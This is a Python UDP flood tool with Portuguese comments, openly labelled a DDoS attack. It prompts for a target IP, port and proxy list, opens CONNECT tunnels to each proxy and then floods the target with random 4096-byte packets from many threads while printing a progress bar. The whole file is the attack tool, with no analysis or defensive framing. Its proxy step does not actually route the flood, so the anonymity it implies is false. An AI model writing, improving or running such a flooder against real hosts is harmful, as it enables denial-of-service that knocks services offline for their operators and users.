import sys
import os
import time
import socket
import random
import threading

# Configurações
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
bytes = random._urandom(4096)

# Limpa a tela
os.system("clear")
os.system("figlet  Ataque DDos ")

# Pergunta o IP e a porta do alvo
ip = input("IP do alvo: ")
port = int(input("Porta: "))

# Pergunta as proxies separadas por vírgula
proxy_str = input("Lista de proxies (separadas por vírgula): ")
proxies = [proxy.strip() for proxy in proxy_str.split(",")]

# Inicia o ataque
os.system("clear")
print("Ataque em andamento!")

# Função para enviar pacotes usando uma proxy específica
def send_packets(proxy_ip, proxy_port):
    global bytes
    global sent

    while True:
        try:
            proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy_sock.settimeout(5)
            proxy_sock.connect((proxy_ip, proxy_port))
            proxy_sock.send(f"CONNECT {ip}:{port} HTTP/1.1\r\nHost: {ip}:{port}\r\n\r\n".encode())

            # Recebe a resposta da proxy
            response = proxy_sock.recv(1024)

            # Envia os pacotes para o alvo
            while True:
                sock.sendto(bytes, (ip, port))
                sent += 1

        except (socket.timeout, ConnectionRefusedError, BrokenPipeError):
            # A conexão com a proxy falhou, tenta com outra
            break
        except Exception as e:
            print(f"Erro ao enviar pacotes: {e}")
            break

# Variáveis para controlar o envio de pacotes
sent = 0
total_sent = 0

# Envia pacotes usando proxies em threads separadas
threads = []
for proxy in proxies:
    proxy_ip, proxy_port = proxy.split(":")
    proxy_port = int(proxy_port)

    thread = threading.Thread(target=send_packets, args=(proxy_ip, proxy_port))
    thread.start()
    threads.append(thread)

# Exibe o progresso
while True:
    time.sleep(1)
    total_sent += sent
    sent = 0

    # Exibe o progresso do ataque a cada 10 segundos
    if total_sent % 10000 == 0:
        os.system("clear")
        print(f"Ataque em andamento! {total_sent} pacotes enviados")
        print("[{:<20}] {:>5}% ".format("=" * int(total_sent/5000), int(total_sent/10000)))
        if total_sent >= 100000:
            break

# Aguarda as threads terminarem
for thread in threads:
    thread.join()

# Finaliza o ataque
sock.close()
print("Ataque finalizado!")
